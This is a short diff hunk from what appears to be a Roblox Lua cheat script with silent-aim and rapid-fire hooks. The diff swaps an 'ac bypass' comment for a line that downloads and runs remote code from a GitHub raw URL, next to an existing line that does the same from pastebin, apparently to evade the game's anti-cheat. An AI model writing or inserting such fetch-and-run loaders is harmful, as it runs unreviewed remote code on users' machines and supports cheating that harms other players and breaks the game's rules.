@@ -44,7 +44,7 @@ local rapidFireMod = {
 
 local Hooks = {}
 
--- ac bypass
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OnChangedCallback/Sidedhook/refs/heads/main/antileak"))()
 loadstring(game:HttpGet("https://pastebin.com/raw/gimbTwW1"))()
 
 -- silent aim hook (separate from forcehit)
